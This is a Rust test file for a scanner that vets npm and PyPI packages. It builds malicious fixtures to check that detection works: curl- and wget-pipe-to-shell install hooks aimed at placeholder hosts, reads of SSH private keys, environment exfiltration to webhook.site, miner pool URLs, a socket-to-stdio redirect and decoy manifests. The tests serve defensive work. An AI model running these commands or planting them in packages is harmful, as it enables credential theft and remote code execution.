#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::too_many_lines,
    clippy::items_after_statements
)]

//! Package vetting (WP6), second round: cache identity for manifest paths,
//! false positives on mainstream package layouts, manifest decoys, bounded
//! dependency lists, and small argument checks.

use std::io::Write as _;
use std::path::{Path, PathBuf};

use file_scanner::{
    mcp_server::FileScannerMcp,
    npm_analysis::{analyze_npm_package, RiskLevel as NpmRisk},
    npm_vuln_db::{check_typosquatting_similarity as npm_typo, get_known_malicious_packages},
    python_analysis::{analyze_python_package, RiskLevel as PyRisk},
    python_vuln_db::{
        check_package_vulnerabilities as py_check, check_typosquatting_similarity as py_typo,
        get_known_malicious_packages as py_malicious,
    },
};
use rmcp::{model::CallToolRequestParams, ServiceExt};
use serde_json::{json, Value};
use tempfile::TempDir;

fn tgz(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_mode(0o644);
        header.set_entry_type(tar::EntryType::Regular);
        header.set_cksum();
        builder.append_data(&mut header, path, *data).unwrap();
    }
    let tar_bytes = builder.into_inner().unwrap();
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(&tar_bytes).unwrap();
    encoder.finish().unwrap()
}

fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let options = zip::write::SimpleFileOptions::default();
    for (path, data) in entries {
        writer.start_file(*path, options).unwrap();
        writer.write_all(data).unwrap();
    }
    writer.finish().unwrap().into_inner()
}

fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    let path = dir.join(name);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(&path, bytes).unwrap();
    path
}

/// A source file with a miner URL and a private-key read, built at run time.
fn evil_js() -> String {
    let pool = ["stratum", "+tcp://pool.example.invalid:3333"].concat();
    format!(
        "const pool = '{pool}';\nrequire('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n"
    )
}

const PKG: &str = r#"{"name":"demo-pkg","version":"1.0.0"}"#;

async fn client() -> rmcp::service::RunningService<rmcp::RoleClient, ()> {
    let (server_io, client_io) = tokio::io::duplex(1 << 20);
    tokio::spawn(async move {
        if let Ok(service) = FileScannerMcp::new().serve(server_io).await {
            let _ = service.waiting().await;
        }
    });
    ().serve(client_io).await.expect("handshake")
}

async fn call(
    client: &rmcp::service::RunningService<rmcp::RoleClient, ()>,
    tool: &str,
    args: Value,
) -> (bool, String) {
    let Value::Object(map) = args else {
        panic!("object")
    };
    let result = client
        .call_tool(CallToolRequestParams::new(tool.to_string()).with_arguments(map))
        .await
        .expect("protocol");
    let text = result
        .content
        .first()
        .and_then(|b| b.as_text())
        .map(|t| t.text.clone())
        .unwrap_or_default();
    (result.is_error == Some(true), text)
}

async fn summary(
    client: &rmcp::service::RunningService<rmcp::RoleClient, ()>,
    tool: &str,
    path: &Path,
) -> Value {
    let (is_error, text) = call(client, tool, json!({"package_path": path})).await;
    assert!(!is_error, "{text}");
    serde_json::from_str(&text).unwrap()
}

// ---------------------------------------------------------------------------
// Cache identity when a manifest file path is passed
// ---------------------------------------------------------------------------

#[tokio::test]
async fn a_manifest_path_is_cached_by_its_whole_directory() {
    let dir = TempDir::new().unwrap();
    let a = write(dir.path(), "a/package.json", PKG.as_bytes());
    write(dir.path(), "a/index.js", b"module.exports = 1;\n");
    let b = write(dir.path(), "b/package.json", PKG.as_bytes());
    write(dir.path(), "b/index.js", evil_js().as_bytes());

    let client = client().await;
    let first = summary(&client, "analyze_npm_package", &a).await;
    assert_eq!(first["cache"], "miss");
    assert_eq!(first["risk"]["level"], "Safe");
    // Same manifest bytes, different directory: not a cache hit, and not Safe.
    let second = summary(&client, "analyze_npm_package", &b).await;
    assert_eq!(second["cache"], "miss", "{second}");
    assert_ne!(second["risk"]["level"], "Safe", "{second}");
    assert!(second["findings"]["total"].as_u64().unwrap() >= 1);

    // A change to a sibling source file invalidates the entry.
    write(dir.path(), "a/index.js", evil_js().as_bytes());
    let third = summary(&client, "analyze_npm_package", &a).await;
    assert_eq!(third["cache"], "miss", "{third}");
    assert_ne!(third["risk"]["level"], "Safe");
    client.cancel().await.unwrap();
}

#[tokio::test]
async fn a_python_manifest_path_is_cached_by_its_whole_directory() {
    let dir = TempDir::new().unwrap();
    let setup = "from setuptools import setup\nsetup(name='demo', version='1.0')\n";
    let a = write(dir.path(), "a/setup.py", setup.as_bytes());
    write(dir.path(), "a/demo.py", b"x = 1\n");
    let b = write(dir.path(), "b/setup.py", setup.as_bytes());
    write(dir.path(), "b/demo.py", evil_js().as_bytes());

    let client = client().await;
    let first = summary(&client, "analyze_python_package", &a).await;
    assert_eq!(first["cache"], "miss");
    let second = summary(&client, "analyze_python_package", &b).await;
    assert_eq!(second["cache"], "miss", "{second}");
    assert!(
        second["findings"]["total"].as_u64().unwrap() >= 1,
        "{second}"
    );
    client.cancel().await.unwrap();
}

// ---------------------------------------------------------------------------
// Mainstream layouts are not rated High or Critical
// ---------------------------------------------------------------------------

#[test]
fn comment_links_type_declarations_and_node_env_are_quiet_in_npm() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    write(
        dir.path(),
        "visit.js",
        b"// see https://gist.github.com/someone/abc123 for the idea\n// https://raw.githubusercontent.com/x/y/main/z.js\nmodule.exports = 1;\n",
    );
    write(
        dir.path(),
        "index.d.ts",
        b"/** Reads process.env and posts it to https://example.com with fetch( */\nexport declare const a: string;\n",
    );
    write(
        dir.path(),
        "dayjs.min.js",
        b"var d=process.env.NODE_ENV!=='production'&&console.warn('see https://day.js.org/docs');module.exports=d\n",
    );
    write(
        dir.path(),
        "lexers.js",
        b"module.exports = { filenames: ['*.bashrc', '.zshrc', '.git-credentials'] };\n",
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(
        analysis.malicious_indicators.overall_risk_score < 20.0,
        "{:?} {:?}",
        analysis.malicious_indicators.risk_reasons,
        analysis.source_findings
    );
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));
    assert!(!analysis.security_analysis.data_exfiltration_risk);
}

#[test]
fn a_click_like_dup2_and_a_gist_comment_are_quiet_in_python() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='click-like', version='8.4.0')\n",
    );
    write(
        dir.path(),
        "click/testing.py",
        b"import os\nclass R:\n    def go(self):\n        os.dup2(self._tmpfile.fileno(), self._targetfd)\n",
    );
    write(
        dir.path(),
        "click/termui.py",
        b"# https://gist.github.com/someone/abc123\nx = 1\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(
        analysis.malicious_indicators.overall_risk_score < 40.0,
        "{:?} {:?}",
        analysis.malicious_indicators.risk_reasons,
        analysis.source_findings
    );
    assert!(analysis
        .source_findings
        .iter()
        .all(|f| f.rule != "Socket redirected to stdio"));
    assert!(!analysis.security_analysis.data_exfiltration_risk);
}

#[test]
fn a_real_socket_dup2_is_still_critical() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='demo', version='1.0')\n",
    );
    write(
        dir.path(),
        "demo.py",
        b"import os, socket\ns = socket.socket()\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\n",
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Socket redirected to stdio" && f.severity == "Critical"));
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        PyRisk::High | PyRisk::Critical
    ));
}

#[test]
fn test_scripts_are_not_matched_against_name_patterns() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "package.json",
        br#"{"name":"uuid-like","version":"9.0.0","scripts":{"test":"node --test test/*.js","lint":"pnpm -w exec nx test"}}"#,
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(
        analysis
            .malicious_indicators
            .known_malicious_patterns
            .is_empty(),
        "{:?}",
        analysis.malicious_indicators.known_malicious_patterns
    );
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));
}

#[test]
fn known_compromised_releases_are_critical_on_their_own() {
    let dir = TempDir::new().unwrap();
    for (name, version) in [("coa", "2.0.3"), ("rc", "1.2.9"), ("eslint-scope", "3.7.2")] {
        let manifest = format!(r#"{{"name":"{name}","version":"{version}"}}"#);
        let path = write(
            dir.path(),
            &format!("{name}/package.json"),
            manifest.as_bytes(),
        );
        let analysis = analyze_npm_package(path.parent().unwrap()).unwrap();
        assert!(
            matches!(analysis.malicious_indicators.risk_level, NpmRisk::Critical),
            "{name}@{version}: {:?}",
            analysis.malicious_indicators.risk_level
        );
    }
    // The same release as a dependency is flagged when pinned.
    let consumer = write(
        dir.path(),
        "consumer/package.json",
        br#"{"name":"consumer","version":"1.0.0","dependencies":{"coa":"2.0.3"}}"#,
    );
    let analysis = analyze_npm_package(consumer.parent().unwrap()).unwrap();
    assert_eq!(
        analysis.dependencies.vulnerability_summary.critical_count,
        1
    );
    // And in a PyPI requirements file.
    let reqs = write(dir.path(), "requirements.txt", b"ctx==0.1.2\nrequests>=2\n");
    let analysis = analyze_python_package(&reqs).unwrap();
    assert_eq!(
        analysis.dependencies.vulnerability_summary.critical_count,
        1
    );
}

// ---------------------------------------------------------------------------
// Decoy manifests
// ---------------------------------------------------------------------------

fn evil_manifest() -> String {
    let hook = ["cu", "rl http://example.invalid/x.sh | sh"].concat();
    format!(
        r#"{{"name":"decoy-demo","version":"2.0.0","scripts":{{"postinstall":"{hook}"}},"dependencies":{{"event-stream":"3.3.6"}}}}"#
    )
}

#[test]
fn a_root_level_decoy_manifest_does_not_hide_the_real_one() {
    let dir = TempDir::new().unwrap();
    let evil = evil_manifest();
    let archive = tgz(&[
        (
            "package.json",
            br#"{"name":"decoy-demo","version":"2.0.0"}"#,
        ),
        ("package/package.json", evil.as_bytes()),
        ("package/index.js", b"module.exports = 1;\n"),
    ]);
    let path = write(dir.path(), "decoy.tgz", &archive);
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(
        analysis.input.manifest.as_deref(),
        Some("package/package.json")
    );
    assert!(analysis.security_analysis.has_postinstall_script);
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::High | NpmRisk::Critical
    ));
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Several package.json files"));
}

#[test]
fn the_last_top_level_manifest_wins_as_npm_extracts_it() {
    let dir = TempDir::new().unwrap();
    let evil = evil_manifest();
    let archive = tgz(&[
        (
            "package/package.json",
            br#"{"name":"decoy-demo","version":"2.0.0"}"#,
        ),
        ("zzz/package.json", evil.as_bytes()),
    ]);
    let path = write(dir.path(), "othertop.tgz", &archive);
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(analysis.input.manifest.as_deref(), Some("zzz/package.json"));
    assert!(analysis.security_analysis.has_postinstall_script);
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("more than one")));
}

#[test]
fn a_directory_with_a_nested_package_json_is_not_flagged() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    write(dir.path(), "esm/package.json", br#"{"type":"module"}"#);
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(analysis.source_findings.is_empty());
}

#[test]
fn a_wheel_with_two_dist_info_directories_is_flagged() {
    let dir = TempDir::new().unwrap();
    let archive = zip_of(&[
        (
            "aaa-1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: aaa\nVersion: 1.0\n",
        ),
        (
            "real-2.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: real\nVersion: 2.0\nRequires-Dist: requests (==2.5.0)\n",
        ),
    ]);
    let path = write(dir.path(), "real-2.0-py3-none-any.whl", &archive);
    let analysis = analyze_python_package(&path).unwrap();
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Several .dist-info directories"));
}

// ---------------------------------------------------------------------------
// Bounded dependency lists
// ---------------------------------------------------------------------------

#[test]
fn an_oversized_dependency_list_is_refused_with_the_limit() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("requirements-big.txt");
    let file = std::fs::File::create(&path).unwrap();
    file.set_len(17 * 1024 * 1024).unwrap();
    let error = analyze_python_package(&path).unwrap_err().to_string();
    assert!(
        error.contains("16 MiB") && error.contains("17 MiB"),
        "{error}"
    );

    let lock = dir.path().join("package-lock.json");
    let file = std::fs::File::create(&lock).unwrap();
    file.set_len(17 * 1024 * 1024).unwrap();
    let error = analyze_npm_package(&lock).unwrap_err().to_string();
    assert!(error.contains("16 MiB"), "{error}");
}

#[test]
fn a_huge_requirements_list_is_capped_with_a_note() {
    let dir = TempDir::new().unwrap();
    let mut text = String::new();
    for i in 0..25_000 {
        text.push_str(&format!("pkg{i}==1.0.0\n"));
    }
    let path = write(dir.path(), "requirements.txt", text.as_bytes());
    let analysis = analyze_python_package(&path).unwrap();
    assert_eq!(analysis.dependencies.install_requires.len(), 20_000);
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("first 20000")));
}

#[test]
fn a_huge_lock_file_is_capped() {
    let dir = TempDir::new().unwrap();
    let mut packages = serde_json::Map::new();
    packages.insert(String::new(), json!({"name": "big", "version": "1.0.0"}));
    for i in 0..25_000 {
        packages.insert(format!("node_modules/p{i}"), json!({"version": "1.0.0"}));
    }
    let lock =
        json!({"name": "big", "version": "1.0.0", "lockfileVersion": 3, "packages": packages});
    let path = write(dir.path(), "package-lock.json", lock.to_string().as_bytes());
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(analysis.dependencies.dependencies.len() <= 20_000);
    assert!(analysis.dependencies.locked_packages.len() <= 20_000);
}

// ---------------------------------------------------------------------------
// Small defects
// ---------------------------------------------------------------------------

#[test]
fn a_version_at_the_integer_limit_does_not_panic() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "package.json",
        br#"{"name":"overflow-demo","version":"1.0.0","dependencies":{"a":">1.0.18446744073709551615"}}"#,
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert_eq!(analysis.package_info.name, "overflow-demo");
}

#[test]
fn a_huge_package_name_is_not_compared() {
    let name = "a".repeat(300_000);
    let started = std::time::Instant::now();
    assert!(npm_typo(&name).is_none());
    assert!(py_typo(&name).is_none());
    assert!(started.elapsed().as_secs() < 2);
}

#[test]
fn official_companion_packages_are_not_typosquats() {
    for name in [
        "eslint-utils",
        "jest-cli",
        "gulp-cli",
        "grunt-cli",
        "puppeteer-core",
        "playwright-core",
        "bcryptjs",
        "fast-glob",
        "pathe",
    ] {
        assert!(npm_typo(name).is_none(), "{name}: {:?}", npm_typo(name));
    }
    for name in ["attr", "boto"] {
        assert!(py_typo(name).is_none(), "{name}: {:?}", py_typo(name));
    }
    // Real typosquats still are.
    assert!(npm_typo("expresss").is_some());
    assert!(npm_typo("lodahs").is_some());
    assert!(py_typo("reqeusts").is_some());
}

#[test]
fn legitimate_names_are_off_the_known_malicious_lists() {
    let npm = get_known_malicious_packages();
    assert!(!npm.contains(&"yarnpkg"));
    let pypi = py_malicious();
    for name in [
        "acquisition",
        "sklearn",
        "beautifulsoup",
        "pytorch",
        "crypto",
    ] {
        assert!(!pypi.contains(&name), "{name}");
    }
}

#[test]
fn the_requests_advisory_starts_at_2_3_0() {
    assert!(py_check("requests", "1.0.0").is_empty());
    assert!(py_check("requests", "2.2.1").is_empty());
    assert_eq!(py_check("requests", "2.9.1").len(), 1);
    assert!(py_check("requests", "2.31.0").is_empty());
}

#[tokio::test]
async fn arguments_are_checked_with_text_a_model_can_act_on() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    write(dir.path(), "index.js", evil_js().as_bytes());
    for i in 0..3 {
        write(
            dir.path(),
            &format!("lib/m{i}.js"),
            b"module.exports = 1;\n",
        );
    }
    let client = client().await;

    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": dir.path(), "section": "findings", "min_severity": "bogus"}),
    )
    .await;
    assert!(is_error);
    assert!(text.contains("critical, high, medium, low"), "{text}");

    let (is_error, text) = call(&client, "analyze_npm_package", json!({"package_path": ""})).await;
    assert!(is_error);
    assert!(!text.contains("Path path"), "{text}");

    // File rows say whether the content was scanned.
    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": dir.path(), "section": "files"}),
    )
    .await;
    assert!(!is_error, "{text}");
    let files: Value = serde_json::from_str(&text).unwrap();
    let rows = files["items"].as_array().expect("rows");
    let manifest = rows
        .iter()
        .find(|r| r["path"] == "package.json")
        .expect("package.json row");
    assert_eq!(manifest["source_scanned"], false);
    assert!(manifest["entropy"].is_null());
    let index = rows.iter().find(|r| r["path"] == "index.js").unwrap();
    assert_eq!(index["source_scanned"], true);
    assert!(index["entropy"].is_number());
    client.cancel().await.unwrap();
}

// ---------------------------------------------------------------------------
// Round 3
// ---------------------------------------------------------------------------

/// A package.json with the given scripts.
fn manifest_with_scripts(scripts: &Value) -> Vec<u8> {
    json!({"name": "demo-pkg", "version": "1.0.0", "scripts": scripts})
        .to_string()
        .into_bytes()
}

/// The download-and-run lines, built at run time so no fixture file on disk
/// holds a literal curl-pipe-shell line.
fn pipe_line() -> String {
    ["curl -s http://payload.example.invalid/i.", "sh | ", "sh"].concat()
}

fn npm_level(entries: &[(&str, &[u8])]) -> (NpmRisk, f32, usize) {
    let dir = TempDir::new().unwrap();
    let path = write(dir.path(), "pkg.tgz", &tgz(entries));
    let analysis = analyze_npm_package(&path).unwrap();
    (
        analysis.malicious_indicators.risk_level,
        analysis.malicious_indicators.overall_risk_score,
        analysis.source_findings.len(),
    )
}

#[test]
fn install_scripts_that_download_and_run_are_high_or_critical() {
    let curl_pipe = pipe_line();
    let wget_pipe = [
        "wget -qO- http://payload.example.invalid/i.",
        "sh | ",
        "bash",
    ]
    .concat();
    let node_e = format!(
        "node -e \"require('child_process').exec('{}')\"",
        curl_pipe.replace('\'', "")
    );
    let curl_then_run = [
        "curl -s http://payload.example.invalid/i.sh -o /tmp/i.sh",
        " && chmod +x /tmp/i.sh && /tmp/i.sh",
    ]
    .concat();
    let sh_c = [
        "sh -c \"$(",
        "curl -fsSL http://payload.example.invalid/i.sh)\"",
    ]
    .concat();
    for (hook, script) in [
        ("postinstall", curl_pipe),
        ("preinstall", wget_pipe),
        ("postinstall", node_e),
        ("install", curl_then_run),
        ("postinstall", sh_c),
    ] {
        let manifest = manifest_with_scripts(&json!({ hook: script }));
        let (level, score, findings) = npm_level(&[("package/package.json", &manifest)]);
        assert!(
            matches!(level, NpmRisk::High | NpmRisk::Critical),
            "{hook}: {script} -> {level:?} {score}"
        );
        assert!(findings >= 1, "{hook}: {script} had no finding");
    }
}

#[test]
fn install_script_findings_name_the_script() {
    let manifest = manifest_with_scripts(&json!({ "postinstall": pipe_line() }));
    let dir = TempDir::new().unwrap();
    let path = write(
        dir.path(),
        "pkg.tgz",
        &tgz(&[("package/package.json", &manifest)]),
    );
    let analysis = analyze_npm_package(&path).unwrap();
    let finding = &analysis.source_findings[0];
    assert_eq!(finding.file, "package/package.json#scripts.postinstall");
    assert_eq!(finding.rule, "Download piped to a shell or interpreter");
    assert!(!analysis.scripts_analysis.dangerous_commands.is_empty());
}

/// Files of one fixture package: path and content.
type Fixture<'a> = Vec<(&'a str, &'a [u8])>;

/// Ordinary packages: calibration holds in the other direction too.
#[test]
fn ordinary_install_scripts_stay_safe_or_low() {
    for scripts in [
        json!({"install": "node-gyp rebuild"}),
        json!({"postinstall": "husky install"}),
        json!({"postinstall": "node scripts/postinstall.js", "test": "jest"}),
        json!({"prepare": "npm run build", "build": "tsc -p .", "test": "node test/examiner.js"}),
        json!({"lint": "eslint src/determiner", "build": "webpack --config ethereum.config.js"}),
        json!({"benchmark:download": "curl -O https://raw.githubusercontent.com/org/repo/main/data.json"}),
        json!({"postinstall": "node -e \"console.log('thanks for installing')\""}),
    ] {
        let manifest = manifest_with_scripts(&scripts);
        let (level, score, _) = npm_level(&[
            ("package/package.json", &manifest),
            (
                "package/index.js",
                b"module.exports = function add(a, b) { return a + b; };\n",
            ),
        ]);
        assert!(
            matches!(level, NpmRisk::Safe | NpmRisk::Low),
            "{scripts} -> {level:?} {score}"
        );
    }
}

#[test]
fn mining_words_in_script_names_are_not_cryptomining() {
    let manifest =
        manifest_with_scripts(&json!({"test": "node test/examiner.js", "dev": "node ethereum.js"}));
    let dir = TempDir::new().unwrap();
    let path = write(
        dir.path(),
        "pkg.tgz",
        &tgz(&[("package/package.json", &manifest)]),
    );
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(!analysis.security_analysis.crypto_mining_indicators);
    // Only install-time scripts are hooks.
    assert!(analysis.scripts_analysis.script_hooks.is_empty());
}

#[test]
fn a_package_json_with_many_scripts_is_capped_and_fast() {
    let mut scripts = serde_json::Map::new();
    for i in 0..60_000 {
        scripts.insert(format!("s{i}"), json!("echo hi"));
    }
    let manifest = manifest_with_scripts(&Value::Object(scripts));
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", &manifest);
    let started = std::time::Instant::now();
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(started.elapsed().as_secs() < 20, "{:?}", started.elapsed());
    assert!(analysis.input.notes.iter().any(|n| n.contains("first 500")));
}

// --- tar extension headers --------------------------------------------------

/// A tar whose first entry is a long-name (`L`) or PAX (`x`) header that declares
/// `declared` bytes of data, which are not there.
fn tar_with_declared_extension(kind: u8, declared: u64) -> Vec<u8> {
    let mut header = tar::Header::new_gnu();
    header.set_path("././@LongLink").unwrap();
    header.set_size(declared);
    header.set_entry_type(tar::EntryType::new(kind));
    header.set_cksum();
    let mut bytes = header.as_bytes().to_vec();
    bytes.extend_from_slice(&[b'a'; 512]);
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(&bytes).unwrap();
    encoder.finish().unwrap()
}

#[test]
fn a_huge_long_name_or_pax_header_is_refused_not_allocated() {
    let dir = TempDir::new().unwrap();
    for kind in *b"Lxg" {
        let path = write(
            dir.path(),
            "bomb.tgz",
            &tar_with_declared_extension(kind, 64 * 1024 * 1024),
        );
        let error = analyze_npm_package(&path).unwrap_err().to_string();
        assert!(error.contains("long-name or PAX header"), "{error}");
        let error = analyze_python_package(&path).unwrap_err().to_string();
        assert!(error.contains("long-name or PAX header"), "{error}");
    }
}

#[test]
fn long_names_in_gnu_and_pax_form_are_still_read() {
    let long_dir = "d".repeat(150);
    // tar::Builder writes GNU long names for paths over 100 bytes.
    let nested = format!("package/{long_dir}/deep/{long_dir}/file.js");
    let archive = tgz(&[
        ("package/package.json", PKG.as_bytes()),
        (nested.as_str(), b"module.exports = 1;\n"),
    ]);
    let dir = TempDir::new().unwrap();
    let path = write(dir.path(), "long.tgz", &archive);
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(
        analysis
            .files_analysis
            .iter()
            .any(|f| f.file_path == nested),
        "{:?}",
        analysis
            .files_analysis
            .iter()
            .map(|f| &f.file_path)
            .collect::<Vec<_>>()
    );

    // PAX: an `x` entry with a `path` record names the next file.
    let pax_path = "package/pax/named.js";
    let record_body = format!(" path={pax_path}\n");
    let len = record_body.len() + 2;
    let record = format!("{len}{record_body}");
    let mut builder = tar::Builder::new(Vec::new());
    let mut pax = tar::Header::new_ustar();
    pax.set_path("PaxHeaders.0/ignored").unwrap();
    pax.set_size(record.len() as u64);
    pax.set_entry_type(tar::EntryType::XHeader);
    pax.set_cksum();
    builder.append(&pax, record.as_bytes()).unwrap();
    let mut file = tar::Header::new_ustar();
    file.set_path("package/short.js").unwrap();
    file.set_size(5);
    file.set_entry_type(tar::EntryType::Regular);
    file.set_cksum();
    builder.append(&file, &b"x=1;\n"[..]).unwrap();
    let mut manifest_header = tar::Header::new_ustar();
    manifest_header.set_path("package/package.json").unwrap();
    manifest_header.set_size(PKG.len() as u64);
    manifest_header.set_entry_type(tar::EntryType::Regular);
    manifest_header.set_cksum();
    builder.append(&manifest_header, PKG.as_bytes()).unwrap();
    let bytes = builder.into_inner().unwrap();
    let path = write(dir.path(), "pax.tar", &bytes);
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(analysis
        .files_analysis
        .iter()
        .any(|f| f.file_path == pax_path));
}

#[test]
fn a_damaged_archive_error_does_not_echo_file_bytes() {
    let dir = TempDir::new().unwrap();
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder
        .write_all(b"hello world, not a tar\nhello world, not a tar\n")
        .unwrap();
    let path = write(dir.path(), "x.tgz", &encoder.finish().unwrap());
    let error = analyze_npm_package(&path).unwrap_err().to_string();
    assert!(!error.contains("hello world"), "{error}");
    assert!(!error.contains('\n'), "{error}");
}

// --- evasions ---------------------------------------------------------------

fn payload_lines() -> String {
    let pool = ["stratum", "+tcp://pool.example.invalid:3333"].concat();
    format!(
        "require('child_process').exec('{}');\nconst pool = '{pool}';\n",
        pipe_line()
    )
}

#[test]
fn a_payload_in_a_declaration_file_is_found() {
    let payload = payload_lines();
    let manifest = manifest_with_scripts(&json!({"postinstall": "node index.js"}));
    let (level, _, findings) = npm_level(&[
        ("package/package.json", &manifest),
        ("package/index.js", b"require('./types.d.ts');\n"),
        ("package/types.d.ts", payload.as_bytes()),
    ]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?}"
    );
    assert!(findings >= 1);
}

#[test]
fn comment_prefixes_do_not_hide_code() {
    let pool = ["stratum", "+tcp://pool.example.invalid:3333"].concat();
    let src = format!(
        "/**/ eval(Buffer.from('QUJD', 'base64').toString());\n\
         /* x */ const k = require('fs').readFileSync(homedir + '/.ssh/id_rsa');\n\
         /* y */ fetch('https://webhook.site/abc', {{body: JSON.stringify(process.env)}});\n\
         /* a */ /* b */ const p = '{pool}';\n"
    );
    let (level, _, findings) = npm_level(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?}"
    );
    assert!(findings >= 4, "{findings}");
}

#[test]
fn text_inside_real_comments_is_still_quiet() {
    let src = "/**\n * Example: child_process.exec('ls'); eval(x)\n * reads ~/.npmrc\n */\n// eval(atob(x))\nmodule.exports = 1;\n";
    let (level, _, findings) = npm_level(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    assert!(matches!(level, NpmRisk::Safe), "{level:?}");
    assert_eq!(findings, 0);
    // A block comment that is never closed does not silence the rest of the file
    // beyond 400 lines.
    let mut long = String::from("/*\n");
    for _ in 0..450 {
        long.push_str(" * filler\n");
    }
    long.push_str("eval(Buffer.from('QUJD', 'base64').toString());\n");
    let (level, _, _) = npm_level(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", long.as_bytes()),
    ]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?}"
    );
}

#[test]
fn macos_metadata_is_dropped_only_when_it_is_metadata() {
    let payload = payload_lines();
    let mut appledouble = vec![0x00, 0x05, 0x16, 0x07];
    appledouble.extend_from_slice(&[0u8; 60]);
    let dir = TempDir::new().unwrap();
    let path = write(
        dir.path(),
        "m.tgz",
        &tgz(&[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", b"require('./._payload.js');\n"),
            ("package/._payload.js", payload.as_bytes()),
            ("package/._index.js", &appledouble),
            ("package/PaxHeaders.1/evil.js", payload.as_bytes()),
        ]),
    );
    let analysis = analyze_npm_package(&path).unwrap();
    let paths: Vec<&str> = analysis
        .files_analysis
        .iter()
        .map(|f| f.file_path.as_str())
        .collect();
    assert!(paths.contains(&"package/._payload.js"), "{paths:?}");
    assert!(paths.contains(&"package/PaxHeaders.1/evil.js"), "{paths:?}");
    assert!(!paths.contains(&"package/._index.js"), "{paths:?}");
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::High | NpmRisk::Critical
    ));
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("ignored 1 macOS")));
}

// --- python identity and calibration ------------------------------------------

const PEP621: &str = r#"[build-system]
requires = ["setuptools>=61"]
build-backend = "setuptools.build_meta"

[project]
name = "realistic-proj"
version = "2.5.0"  # bumped
description = "A \"quoted\" description"
requires-python = ">=3.8"
authors = [{name = "Alice Example", email = "alice@example.invalid"}]
keywords = ["a", "b"]
dependencies = [
    "requests==2.5.0",
    "click>=8",  # cli
]

[project.urls]
Homepage = "https://example.invalid"

[tool.black]
line-length = 100
name = "not-the-package"
version = "9.9.9"

[[tool.mypy.overrides]]
module = "x"
python_version = "3.8"
"#;

#[test]
fn a_pep_621_pyproject_gives_its_own_name_version_and_pins() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "pyproject.toml", PEP621.as_bytes());
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert_eq!(analysis.package_info.name, "realistic-proj");
    assert_eq!(analysis.package_info.version, "2.5.0");
    assert_eq!(
        analysis.package_info.author.as_deref(),
        Some("Alice Example")
    );
    assert_eq!(
        analysis.package_info.python_requires.as_deref(),
        Some(">=3.8")
    );
    assert_eq!(
        analysis.package_info.description.as_deref(),
        Some("A \"quoted\" description")
    );
    let requests = &analysis.dependencies.install_requires["requests"];
    assert_eq!(requests.version_spec, "==2.5.0");
    assert!(
        requests
            .vulnerabilities
            .iter()
